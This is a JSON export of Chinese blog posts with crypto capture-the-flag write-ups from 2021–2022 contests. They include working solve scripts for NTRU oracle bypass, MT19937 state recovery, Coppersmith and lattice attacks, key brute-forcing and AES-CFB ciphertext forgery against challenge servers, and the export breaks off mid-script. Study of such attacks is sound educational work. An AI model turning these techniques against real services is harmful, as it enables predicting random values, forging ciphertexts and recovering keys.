[{"title":"The writeup for 2022ByteCTF(Crypto part).","date":"2022-09-25T08:24:23.000Z","path":"2022/09/25/The writeup for 2022ByteCTF(Crypto part)./","text":"该更新更新blog了，总的来说今年体验不如去年，能学到东西的除了Card Shark的MT19937通用方法外，没啥新鲜的了 Choose_U_FlagNTRU但不完全对。也没理解到出题人的意思，而且似乎题目的NTRU也有点问题。但不影响直接非预期解决。 题目流程挺简单的，服务端随机生成一个12bytes的可打印字符串，然后用NTRU加密，加密以后把密文coefficient发回来。 服务端提供了一次解密服务，但要求我们上传的密文coefficient不能是他发过来的那个，也就是说不能直接解密刚刚发回来的密文 对发送的密文的判断只是简单的判断和random_key的系数是否完全相同。哥们直接找个系数加个64不就不同了，反正到时候算的时候就被模掉了…. 事实上我还可以旋转密文，还可以LLL日私钥，反正挺多解法的，就是不知道预期该是怎样的 exp没有exp，key_coefficients复制下来找个你觉得喜欢的数字把他加个64发过去就拿到random_key了 有没有可能预期就是这样呢 Compare题目要我们先传个表达式上去，这个表达式得够油，油到后面自己能根据，来控制这个表达式的True of False。 考的就是同态。看看加密 Encrypt：所以计算，解密出来的就是了，但由于mod的存在让结果永远都是整数了。 n是512位的 所以如果 那么 大概率是小于 的，而 那大概率是大于的 所以我们传expr = MSG - 2 ** 511 &lt; 0，每轮算一次发过去，服务器那边eval()的内容就会变成这个式子与的正确性大概率是一样的了。 exp12345678910111213141516from pwn import *from Crypto.Util.number import getPrime, getRandomNBitInteger, inverseimport reCHALLENGE_ID = ''p = remote(CHALLENGE_ID + '.2022.capturetheflag.fun', 1337, ssl=True)resp = p.recvuntil(\"expr:\")p.sendline('MSG - 2 ** 511 &lt; 0')for _ in range(100): resp = p.recvuntil(\"msg = \") n = int(re.findall(r'n = (.*)\\n',resp.decode())[0]) a = int(re.findall(r'a = (.*)\\n',resp.decode())[0]) b = int(re.findall(r'b = (.*)\\n',resp.decode())[0]) s = (a * inverse(b,n * n)) % (n * n) p.sendline(str(s))print(p.recv(1024)) Card Shark这题算是比较有意思的一题了（全靠其他题衬托。 就是单纯的日MT19937，通过前面的轮次来获得getrandbits()的输出，利用这些输出来还原生成器内部的状态，从而预测后续的随机数。 这里用到一个利用线性关系构造矩阵的解决办法。 这个办法很牛，理论上只要拿到19968位的输出，就能日烂MT19937，就是需要的时间有一点长。 如果对MT19937有了解过，就知道里面的所有操作线性的，也就是说每一次输出的每一位都是由一开始的624个状态线性变换得来的。 因为每个状态是32位，不妨记初始状态为，那么对于某次输出的某一位，会有 这里的就是一个线性关系。那么，对于19968个输出，可以有一整个矩阵的线性关系对应。 而这个攻击方法的核心就是只与是哪次输出的哪一位有关系。 也就是说，只要我们能知道19968位，并且知道它们都是第几次输出的第几位，就能够还原出。 首先，从到遍历，分别用这19968个状态去生成已知那19968位对应的。这里得到的由于取的都是1，所以它就是的每一行。 通过上面的构造拿到对应的以后，再用我们已知的那19968位去计算得到 然后就是由状态推后面的状态了 参考 https://www.anquanke.com/post/id/205861#h3-9 后面的扩展部分。 exp矩阵的生成 12345678910111213141516171819202122232425262728# sagefrom random import Randomfrom tqdm import tqdmLENGTH = 19968mask = '11110000000000000000000000000000' # mask长度为32 比如输出的是高4位，那么mask = 11110000000000000000000000000000knownbits = mask.count('1')# 生成只有一个1的statestates = []for i in tqdm(range(LENGTH)): state = ['0'] * LENGTH state[i] = '1' # 每32个组成一个数 states.append((3,tuple([int(''.join(state[_:_ + 32]),2) for _ in range(0,LENGTH,32)] + [0]),None))T = Matrix(GF(2),LENGTH,LENGTH)for i in tqdm(range(LENGTH)): R = Random() R.setstate(states[i]) # 利用mask生成向量Z，Z就是T的第i行 Z = [] for _ in range(LENGTH // knownbits): rd = bin(R.getrandbits(32))[2:].zfill(32) for r,j in zip(rd,mask): if j == '1': Z.append(int(r)) for z in range(len(Z)): T[i,z] = Z[z] save(T,'Matrix.sobj') 生成完拿去还原状态就行了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970# sagefrom random import Randomfrom tqdm import tqdmdef recoverState(leak): x = T.solve_left(vector(leak)) x = ''.join([str(i) for i in x]) state = [] for i in range(624): tmp = int(x[i * 32:(i + 1) * 32], 2) state.append(tmp) return statedef backfirst(state): high = 0x80000000 low = 0x7fffffff mask = 0x9908b0df tmp = state[623] ^^ state[396] if tmp &amp; high == high: tmp = mask ^^ tmp tmp &lt;&lt;= 1 tmp |= 1 else: tmp &lt;&lt;= 1 return int((1 &lt;&lt; 32 - 1) | tmp &amp; low), int(tmp &amp; low)def pwn(leak): state = recoverState(leak) L = [leak[i] for i in range(100 * knownbits)] prng = Random() guess1, guess2 = backfirst(state) state[0] = guess1 s = state prng.setstate((3, tuple(s + [0]), None)) g1 = [] for _ in range(100): rd = bin(prng.getrandbits(32))[2:].zfill(32) for r,j in zip(rd,mask): if j == '1': g1.append(int(r)) if g1 == L: print(\"first\") prng.setstate((3, tuple(s + [0]), None)) return prng state[0] = guess2 s = state prng.setstate((3, tuple(s + [0]), None)) g2 = [] for _ in range(100): rd = bin(prng.getrandbits(32))[2:].zfill(32) for r,j in zip(rd,mask): if j == '1': g1.append(int(r)) if g2 == L: print(\"second\") print(s + [0]) prng.setstate((3, tuple(s + [0]), None)) return prngT = load('Matrix.sobj')length = 19968mask = '11110000000000000000000000000000'knownbits = mask.count('1')prng = Random()leaks = open('state','r').read()leak = [int(i) for i in leaks]R = pwn(leak)# R就是最后还原得到的生成器","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"}]},{"title":"the summary of 2022 AntCTF x D^3CTF","date":"2022-03-08T00:31:06.000Z","path":"2022/03/08/the-summary-of-2022-AntCTF-x-D-3CTF/","text":"算是很久没打比赛后的第一场认真看题的比赛，就只做出一题比较白给的题，剩下的题要么卡在了错误的方向上，要么就是方法对了实际做的时候不会调参数这些（吃了不理解Coppersmith的大亏，就当是复健的第一次复盘了。 有些题看着论文感觉可行，但没有办法把论文中提到的方法给复现出来…… d3factor1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import bytes_to_long, getPrimefrom secret import msgfrom sympy import nextprimefrom gmpy2 import invertfrom hashlib import md5flag = 'd3ctf{'+md5(msg).hexdigest()+'}'p = getPrime(256)q = getPrime(256)assert p &gt; qn = p * qe = 0x10001m = bytes_to_long(msg)c = pow(m, e, n)N = pow(p, 7) * qphi = pow(p, 6) * (p - 1) * (q - 1)d1 = getPrime(2000)d2 = nextprime(d1 + getPrime(1000))e1 = invert(d1, phi)e2 = invert(d2, phi)print(f'c = {c}')print(f'N = {N}')print(f'e1 = {e1}')print(f'e2 = {e2}')'''c = 2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967N = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791e1 = 425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029e2 = 1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919''' 这道题是最先做的一道题，也是做了最久的一道题，一直以来我都对能使用Coppersmith method的equation不太敏感，这次就是这个问题导致简单的题没有整出结果来。 这题在做的时候其实查到了一篇用格来解决的文章New attacks on RSA with Moduli （查到这篇文章的时候贼兴奋，以为这题就要被我斩于马下了！其实里面采用的构造格的方法就是类似Coppersmith method里的方法！！！但我根本没反应过来，按着文章里的格基一直在调都没有什么好的结果，于是这题就被放在一边了。 赛后看神仙爷爷们轻车熟路的Coppersmith我才反应过来我一直想要复现出来的东西，就是Copper….. 题目里给的两个的生成过程可以看出并且，对于给出的两个，我们其实是可以很快写出这个equation的（当时做的时候也写出来看了然后就是关键的点了，关键的地方在于这个，这个是的一个很大的factor了，到这里其实就应该反应过来要用copper求了 求出自然就能求出了，剩下的就是gcd和正常的解密了 一点都不难的题，我就是没有意识到Coppersmith 12345678910111213141516171819from gmpy2 import irootfrom Crypto.Util.number import long_to_bytesN = 1476751427633071977599571983301151063258376731102955975364111147037204614220376883752032253407881568290520059515340434632858734689439268479399482315506043425541162646523388437842149125178447800616137044219916586942207838674001004007237861470176454543718752182312318068466051713087927370670177514666860822341380494154077020472814706123209865769048722380888175401791873273850281384147394075054950169002165357490796510950852631287689747360436384163758289159710264469722036320819123313773301072777844457895388797742631541101152819089150281489897683508400098693808473542212963868834485233858128220055727804326451310080791e1 = 425735006018518321920113858371691046233291394270779139216531379266829453665704656868245884309574741300746121946724344532456337490492263690989727904837374279175606623404025598533405400677329916633307585813849635071097268989906426771864410852556381279117588496262787146588414873723983855041415476840445850171457530977221981125006107741100779529209163446405585696682186452013669643507275620439492021019544922913941472624874102604249376990616323884331293660116156782891935217575308895791623826306100692059131945495084654854521834016181452508329430102813663713333608459898915361745215871305547069325129687311358338082029e2 = 1004512650658647383814190582513307789549094672255033373245432814519573537648997991452158231923692387604945039180687417026069655569594454408690445879849410118502279459189421806132654131287284719070037134752526923855821229397612868419416851456578505341237256609343187666849045678291935806441844686439591365338539029504178066823886051731466788474438373839803448380498800384597878814991008672054436093542513518012957106825842251155935855375353004898840663429274565622024673235081082222394015174831078190299524112112571718817712276118850981261489528540025810396786605197437842655180663611669918785635193552649262904644919PR.&lt;x&gt; = PolynomialRing(Zmod(N))f = (e1 * e2) * x - (e2 - e1)f = f.monic()delta = int(f.small_roots(X=2^1000,beta=0.5)[0])p6 = gcd((e1 * e2) * delta - (e2 - e1),N)p = int(iroot(p6,6)[0])q = N // p6 // p n = p * qphi = (p-1) * (q-1)c = 2420624631315473673388732074340410215657378096737020976722603529598864338532404224879219059105950005655100728361198499550862405660043591919681568611707967d = inverse_mod(0x10001,phi)long_to_bytes(pow(c,d,n))# b\"MM is still working on Valentine's Day.You can't be like him.\" 有个奇怪的问题就是，如果用sage带的small_roots跑上面那个文章给的数据是跑不出答案的。会不会文章中所使用的方法比small_roots解决这类问题好的多？（可能性不大，因为这个问题本质还是finding small roots？ Orz…. d3qcg……挺无语的，这题因为没有注意调参数而没做出来，也就是因为对二元copper的模板不够熟悉吧。 使用bivariate polynomials的copper一般可以用https://github.com/defund/coppersmith里的coppersmith.sage 其实univariate的也可以用它，但是在定义PolynomialRing的时候要注意定义成Mutivariate的 12PR.&lt;x&gt; = PolynomailRing(Zmod(N),1)# difference from PR.&lt;x&gt; = PolynomialRing(Zmod(N)) 刚好再学习学习一下Coppersmith的界，具体Coppersmith’s method到底是怎样进行操作的可以看原论文或者V神的这篇文章https://www.anquanke.com/post/id/211028，他的文章一共有三部分真的很详细很有帮助。 这里就复习一下界吧 对于Univariate Polynomials Given a monic polynomial of degree , modulo an integer of unknown factorization, one can find in time polynomial in all integers such that and . 对于Bivariate Polynomials Let be an irreducible polynomial in two variables over , of maximum degree in each variable separately. Let and be upper bounds on the desired integer solution , and let . If , then in time polynomial in, one can find all integer pairs such that , and . 这道题的背景是QCG（Quadratic Congruential Generator），具体的定义是这样的这道题里面没有一次项系数，也就是说这道题的式子是这样的 题目给了以及的高位，让我们求。在这里可以先定义 我们可以将式子，写成这里其实就能看出是二元Coppersmith了，求出就可以做出来了 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from Crypto.Util.number import long_to_bytesimport itertoolsdef small_roots(f, bounds, m=1, d=None): if not d: d = f.degree() R = f.base_ring() N = R.cardinality() f /= f.coefficients().pop(0) f = f.change_ring(ZZ) G = Sequence([], f.parent()) for i in range(m+1): base = N^(m-i) * f^i for shifts in itertools.product(range(d), repeat=f.nvariables()): g = base * prod(map(power, f.variables(), shifts)) G.append(g) B, monomials = G.coefficient_matrix() monomials = vector(monomials) factors = [monomial(*bounds) for monomial in monomials] for i, factor in enumerate(factors): B.rescale_col(i, factor) B = B.dense_matrix().LLL() B = B.change_ring(QQ) for i, factor in enumerate(factors): B.rescale_col(i, 1/factor) H = Sequence([], f.parent().change_ring(QQ)) for h in filter(None, B*monomials): H.append(h) I = H.ideal() if I.dimension() == -1: H.pop() elif I.dimension() == 0: roots = [] for root in I.variety(ring=ZZ): root = tuple(R(root[var]) for var in f.variables()) roots.append(root) return roots return []p = 7386537185240346459857715381835501419533088465984777861268951891482072249822526223542514664598394978163933836402581547418821954407062640385756448408431347a = 3591518680290719943596137190796366296374484536382380061852237064647969442581391967815457547858969187198898670115651116598727939742165753798804458359397101b = 6996824752943994631802515921125382520044917095172009220000813718617441355767447428067985103926211738826304567400243131010272198095205381950589038817395833w0 = 67523583999102391286646648674827012089888650576715333147417362919706349137337570430286202361838682309142789833 * 2 ^ 146w1 = 70007105679729967877791601360700732661124470473944792680253826569739619391572400148455527621676313801799318422* 2 ^ 146Fp = GF(p)b,w0,w1 = map(Fp, [b,w0,w1])P.&lt;k0, k1&gt; = PolynomialRing(Fp)f = a * (w0 + k0) ^ 2 - w1 + b - k1roots = small_roots(f, [2^146, 2^146],m=3,d=6)k0, k1 = roots[0]# (50712831100361370819145886978385347931029768,9089234402520025586415667640120652372860183)","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Coppersmith","slug":"Coppersmith","permalink":"http://tearsjin.github.io/tags/Coppersmith/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"},{"name":"LFSR","slug":"LFSR","permalink":"http://tearsjin.github.io/tags/LFSR/"}]},{"title":"crypto复健-2021长城杯","date":"2022-02-21T11:39:36.000Z","path":"2022/02/21/2021长城杯/","text":"0x00 baby_rsaproblem1234567891011121314151617181920212223242526272829303132333435#!/usr/bin/env python3from Crypto.Util.number import *from secret import flag, v1, v2, m1, m2def enc_1(val): p, q = pow(v1, (m1+1))-pow((v1+1), m1), pow(v2, (m2+1))-pow((v2+1), m2) assert isPrime(p) and isPrime(q) and ( p*q).bit_length() == 2048 and q &lt; p &lt; q &lt;&lt; 3 return pow(val, 0x10001, p*q)def enc_2(val): assert val.bit_length() &lt; 512 while True: fac = [getPrime(512) for i in range(3)] if isPrime(((fac[0]+fac[1]+fac[2]) &lt;&lt; 1) - 1): n = fac[0]*fac[1]*fac[2]*(((fac[0]+fac[1]+fac[2]) &lt;&lt; 1) - 1) break c = pow(val, 0x10001, n) return (c, n, ((fac[0]+fac[1]+fac[2]) &lt;&lt; 1) - 1)if __name__ == \"__main__\": assert flag[:5] == b'flag{' plain1 = bytes_to_long(flag[:21]) plain2 = bytes_to_long(flag[21:]) print(enc_1(plain1)) print(enc_2(plain2))'''15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311(40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083, 43001726046955078981344016981790445980199072066019323382068244142888931539602812318023095256474939697257802646150348546779647545152288158607555239302887689137645748628421247685225463346118081238718049701320726295435376733215681415774255258419418661466010403928591242961434178730846537471236142683517399109466429776377360118355173431016107543977241358064093102741819626163467139833352454094472229349598479358367203452452606833796483111892076343745958394932132199442718048720633556310467019222434693785423996656306612262714609076119634814783438111843773649519101169326072793596027594057988365133037041133566146897868269, 39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739)''' solve也不知道为啥，看了别的爷的wp说v和m都是很小的数，直接爆破就完事了…(可能是因为我是复盘所以少了点hint？？？) 剩下的另一半，给出的一个因数都比m大了，直接用它做就好了，就是不知道为啥脚本里都说是素数了，却还是可以分解的…… 123456789101112131415161718192021from gmpy2 import invertfrom tqdm import tqdmfrom Crypto.Util.number import long_to_bytes,isPrimec1 = 15808773921165746378224649554032774095198531782455904169552223303513940968292896814159288417499220739875833754573943607047855256739976161598599903932981169979509871591999964856806929597805904134099901826858367778386342376768508031554802249075072366710038889306268806744179086648684738023073458982906066972340414398928411147970593935244077925448732772473619783079328351522269170879807064111318871074291073581343039389561175391039766936376267875184581643335916049461784753341115227515163545709454746272514827000601853735356551495685229995637483506735448900656885365353434308639412035003119516693303377081576975540948311c2 = 40625981017250262945230548450738951725566520252163410124565622126754739693681271649127104109038164852787767296403697462475459670540845822150397639923013223102912674748402427501588018866490878394678482061561521253365550029075565507988232729032055298992792712574569704846075514624824654127691743944112075703814043622599530496100713378696761879982542679917631570451072107893348792817321652593471794974227183476732980623835483991067080345184978482191342430627490398516912714451984152960348899589532751919272583098764118161056078536781341750142553197082925070730178092561314400518151019955104989790911460357848366016263083fac4 = 39796272592331896400626784951713239526857273168732133046667572399622660330587881579319314094557011554851873068389016629085963086136116425352535902598378739d = invert(0x10001,190*192*627382*1720754738477317127758682285465031939891059835873975157555031327070111123628789833299433549669619325160679719355338187877758311485785197492710490)m2 = long_to_bytes(pow(c2 % fac4,d,fac4)).decode()for v in tqdm(range(2,300)): for m in range(2,300): p = pow(v,m+1) - pow(v+1,m) if isPrime(p): d = invert(0x10001,p-1) m1 = pow(c1 % p,d,p) try: m1 = long_to_bytes(m1).decode() if 'flag' in m1: print(m1+m2) except: pass …挺离谱的？","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"}]},{"title":"writeup for 2021 ByteCTF 线上","date":"2021-10-18T00:28:24.000Z","path":"2021/10/18/writeup-for-2021-ByteCTF-线上/","text":"Byte线上, 勉强前20挤进线下了, 属实刺激 题目难度中等把, 不会特别白给但也不会特别难, 就是某道题CFB搞不懂摸了将近一天才在最后一个小时摸出来 easyxor题目把分成两部分, 并且给了一个加密用的函数, 看了眼的大小, 是吧, 喜欢短的是吧, 待会就把它给爆了 先来看, 加密用的模式是, 这里有一个点要想到, 的前缀是ByteCTF{刚好8字节也就是一个分组. 对着上面的解密过程, 因为第一个明文ByteCTF{密文分组都有了, 可以直接异或计算出第一块的 第二块的是第一块加密得到, 如果我们能够运行加密程序, 我们就能还原出后面的明文, 但我们没有key, 没办法跑加密 不过一开始有提到, 的大小就这么大, 完全可以花一点时间爆破, 所以思路有了, 直接穷举所有的, 能把后面的两组密文还原成uuid(这个uuid形式也是猜出来的, 觉得有可能就试了一下)那种形式的字符串的就是对的. 爆破出以后就是考虑怎么写的逆操作, 也就是解密操作,逆出来了就能拿到了,但是,整了半天没啥头绪, 干脆上Z3直接日, 没想到真的能日出来. 拿到了和, 我们又可能逆操作, 用的是模式, 那不是要什么有什么? 1234567891011121314151617181920212223242526272829303132333435# key爆破cip = '89b8aca257ee2748f030e7f6599cbe0cbb5db25db6d3990d3b752eda9689e30fa2b03ee748e0da3c989da2bba657b912'cp = [cip[i:i+16] for i in range(0,len(cip),16)]flag = b'ByteCTF{'last = bytes_to_long(flag) ^ int(cp[0],16)for i in range(-32, 33): for j in range(-32, 33): for k in range(-32, 33): for l in range(-32, 33): last = bytes_to_long(flag) ^ int(cp[0],16) keys = [i,j,k,l] try: m1,last = decry_ofb(int(cp[1],16),keys,last) M = m1.decode('ASCII') m2,last = decry_ofb(int(cp[2],16),keys,last) M = M + m2.decode('ASCII') if check(M): print(M,keys) except: pass# [-12, 26, -3, -31]key = [-12, 26, -3, -31]IV = 16476971533267772345S = z3.Solver()x = z3.BitVec('x',65)S.add(convert(x,key) == int(cp[5],16))if S.check(): print(S.model())print(long_to_bytes(10936161096540945944 ^ int(cp[4],16)))# 这是最后一个密文分组的Z3脚本, 每个分组都是手动填参数算出来的, 一共四个分组, OFB一个分组, CBC三个分组都需要Z3# 注意的是有时候Z3会有多个解, 需要转成字符串判断是不是正确的解, 不正确的排除掉 md爆破key的时候忘了每次都重置一下last, 爆了一上午的key都没有结果, 属实纯铸币了这波, 还好下午赶着打apex, 硬是重新写了遍脚本才发现问题. 总之z3 yyds! abusedkey两个没有见过的协议, 看到就想摸了, 后面没新题属实是摸不下去了, 题目都快穿了都, 赶紧解压附件看题. 这协议也就是看着烦而已, 认真看下去还是可以做的, 就是tm给hint还给的这么麻烦, 直接跳过hint了 题目给的协议过程就不复述了, 第一个协议的关键部分在下面 ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ ​ 最后得到的是加密过后的, 要解密肯定得知道也就是要知道, 问题在于这题我们不知道应该知道的和 , 这就没办法算了. 不过后面有提到: Server的私钥/口令哈希，都源自同一个2字节口令，即，并且； 好家伙位的口令, 又是这么短的, 那不是直接爆吗老哥, 有就等于有了, 那么问题的关键就在于怎么去选择, 使得不用知道也能计算, 那第一眼看到的不就是这一项吗? 直接取, 那整个的计算就变成就是客户的公钥, 这个是有的, 到这里我们就能够计算再计算,最后用解密就行 至于协议二, 没研究怎么整, 赛后听L-team的帝叁叁币四踢零爷说协议二就是给的, 所以结果是我太暴力了是吗? 爆, 能爆的都可以爆, 爆就完事了, 就是爆的时候发现小小的一个16位居然要花我20分钟, 赶紧打开TIMI来一把, 没想到十分钟就出来了, 果断点了投降交了. 12345678910111213141516171819202122232425262728293031import requestsfrom Crypto.Util.number import long_to_bytes,bytes_to_longfrom hashlib import sha256from Crypto.Cipher import AESfrom tqdm import tqdmurl = 'http://39.105.181.182:30000/abusedkey/server/msg11'session_id = '8cae789b1eac36ad274ee14cac147bdf2dde49585c8db2463d5b6b5f7f44e4da'p = 2 ^ 256 - 2^32 - 977Ep = EllipticCurve(GF(p),[0,7])G = Ep((0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8))Pc = Ep((0xb5b1b07d251b299844d968be56284ef32dffd0baa6a0353baf10c90298dfd117,0xea62978d102a76c3d6747e283091ac5f2b4c3ba5fc7a906fe023ee3bc61b50fe))Msg12 = requests.get(url,data=session_id).texturl = 'http://39.105.181.182:30000/abusedkey/server/msg13'Tc = -Pcdata13 = session_id + hex(Tc[0])[2:].ljust(64,'0') + hex(Tc[1])[2:].ljust(64,'0')Msg14 = long_to_bytes(int(requests.get(url,data=data13).text,16))iv = Msg14[:12]enc_flag = Msg14[12:-16] for i in tqdm(range(2**16)): ds = bytes_to_long(sha256(long_to_bytes(i)).digest()) KCS = -ds * Pc sk = sha256(long_to_bytes(KCS[0])).digest() A = AES.new(sk,AES.MODE_GCM,iv) flag = A.decrypt(enc_flag) if b'Byte' in flag: print(flag) break Overheard题目就那么几行, 流程倒是挺容易懂的, 就是一开始以为考点是Elgamal啥的, 后来才发现就是日格子? 题目给的条件先列举一下是已知的, 解释一下后面两行, 后面两行就是利用to_bob()函数, 传得到的, 重点就是后面那两行式子, 把代进最后一行就可以有看到这种等式马上就想到鸽鸡龟约了, 而且都很小, 64位, 直接根据等式造格子就vans了这个格子有个细节就是第三行得是而不是, 否则目标向量里会有, 而不是, 才是我们想要的啊. 这波细不细 喜闻乐见就是调用的, 从遍历到就行了 规约出短向量就有了, 直接算就是了 由于sagemath很难装pwntools, 我的机器没办法直接写一次性打的脚本, 只能靠手速把条件复制出来扔进sage里跑再手动扔回给服务器(其实就是懒得开wsl了, 你还别说, 这10s内复制黏贴进sage再复制结果回来发过去还真有些难, 还好平时有锻炼手速, 不然还真拿不到这题的二血 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556# 连接用脚本import pwnfrom gmpy2 import invertfrom random import randintp = 62606792596600834911820789765744078048692259104005438531455193685836606544743g = 5con = pwn.remote('39.105.38.192',30000)resp = con.recvuntil(\"$ \").decode()con.sendline('1'.encode())resp = con.recvuntil(\"$ \").decode()Alice = int(resp.split('\\n')[0])con.sendline('2'.encode())resp = con.recvuntil(\"$ \").decode()Bob = int(resp.split('\\n')[0])con.sendline('3'.encode())resp = con.recv(1024).decode()con.sendline(str(Alice).encode())resp = con.recvuntil(\"$ \").decode()AliceBob = int(resp.split('\\n')[0])print('c1 = ',AliceBob)con.sendline('3'.encode())resp = con.recv(1024).decode()con.sendline(str(pow(Alice,2,p)).encode())resp = con.recvuntil(\"$ \").decode()AliceBob = int(resp.split('\\n')[0])print('c2 = ',AliceBob)con.sendline('4'.encode())resp = con.recv(1024).decode()SEND = input('send: ')con.sendline(str(SEND).encode())resp = con.recv()print(resp)# sagec1 = 29599245400103510126844665705234428663959969687042945989429410277722893058048c2 = 17549134874331317464534964139671627000441097203060226867571953366738719997952p = 62606792596600834911820789765744078048692259104005438531455193685836606544743for i in range(128): M = Matrix([[2^i,0,c2 - c1 ^2],[0,1,-2 * c1],[0,0,-p]]) if M.LLL()[0][0] // (2 ^ i) == 1: res = M.LLL()[0] print(M.LLL()[0]) break x1 = res[1]x1 + c1 # g^ab JustDecrypt就是这题试了快一天, 在别人家的学校的图书馆吹风坐了一下午cao 说实话这题整了半天到现在也没搞懂这Crypto库的AES-CFB是怎样的模式, 反正就很离谱, 那个IV就不知道它是拿来怎么用的,还好硬是看规律摸出来了 要关注的第一个点是unpad()函数, 这个函数太简单了,出大问题, 可以通过控制解密出的明文的最后一个字节, 来进行对解密的明文按自己需要来截断 第二个点就是这个奇怪的Crypto.AES_CFB , 反正就是乱传各种数字给服务器, 传了可能一个上午吧大概,发了一堆0和1后发现, 更改密文的某一个字节的时候, 最多影响后面的16个字节的解密 某个字节从\\x00更改到\\x??, 那么解密出的明文对应的那个字节会异或\\x?? 每次解密用的, 似乎是上一个密文的后个字节(?存疑问 用上面三个结论, 我们就能构造目标明文对应的密文了 我们先传2048 * \\x00, 会得到一串abababababab这种形式的明文, 根据这个明文计算END = ab ^ 1 , 以后每次传的密文最后都带着END, 并且END前面的密文的16个字节都是\\x00 ,就能控制解密出的明文的最后一个字节是\\x01, 这样把返回的明文的长度控制在最长, 我们可以更改END = ab ^ 1中的1, 从而可以控制返回的明文为任意长度. Hello, I'm a Bytedancer. Please give me the flag!对应的十六进制是 48656c6c6f2c2049276d2061204279746564616e6365722e20506c656173652067697665206d652074686520666c616721 假设我们第一步得到的ababababab形式的明文是7c7c7c7c7c7c7c7c7c7c7c7c7c7c7c7c 那么构造的密文的第一位就是0x7c ^ 0x48 = 0x34, 接下来就传\\x00 32 +\\x34 + \\x00 2012 + END 假设返回的明文是xxxxxxxxxxxxxxxxxxxxxxx4820506c656173xxxxxxxxx7c7c7c7c7c7c7c7c7c7c7c7c7c7cc7c7c7c 那么构造的密文的第二位就是0x20 ^ 0x65 = 0x45 (0x20是上面48的后面一个字节, 0x65是我的目标明文也就是Hello中的e), 然后继续传\\x00 32 +\\x34\\x45 + \\x00 2010 + END 以此类推 最后构造出我们需要的密文后, 再用1中控制返回明文长度的方法, 把明文截断到刚好是 Hello, I'm a Bytedancer. Please give me the flag!即可 上面的过程需要不断的调试才能整的明白… 由于远程是有proof_of_work()的, 建议在本地关掉proof_of_work()打完本地再打远程, 不然可能就会感受半分钟调试一次, 半年拿到flag的感觉吧 下面的脚本是打比赛的时候写的, 在构造密文的时候把传的密文分成了三段来进行上述的过程, 效果是一样的. 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556import pwnfrom hashlib import sha256import codecsfrom time import sleepdef proof(END, HASH): table = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' for i in table: for j in table: for k in table: for l in table: STR = i + j + k + l + END if sha256(STR.encode()).hexdigest() == HASH: print(i + j + k + l) return i + j + k + lpt = b\"Hello, I'm a Bytedancer. Please give me the flag!\"con = pwn.remote('39.105.181.182', 30001)resp = con.recvuntil('&gt; ').decode().split('\\n')[-2]END = resp[12:40]HASH = resp[45:]con.sendline(proof(END,HASH).encode())resp = con.recvuntil('&gt; ').decode()con.sendline(('0' * 1024).encode())resp = con.recvuntil('&gt; ').decode()tmp = int(resp.split('\\n')[1][32:34], 16)END = hex(tmp ^ 1)[2:].ljust(2, '0')DATA = ['0'] * 1022 + [END[0] , END[1]]roundnum = ''TABLE = [50,250,450]for i in range(49): sleep(1) idx = TABLE[i % 3] roundnum += hex(tmp ^ pt[i])[2:].rjust(2,'0') for j in range(len(roundnum)): DATA[idx + j] = roundnum[j] con.sendline((''.join(DATA)).encode()) resp = con.recvuntil('&gt; ').decode() print(i,roundnum.zfill(98)) tmp = int(resp.split('\\n')[1][TABLE[i%3]+2*i + 2:TABLE[i%3]+2+2*i + 2],16)roundnum += hex(tmp ^ pt[i])[2:].ljust(2,'0')con.sendline(('0' * 2048).encode())resp = con.recvuntil('&gt; 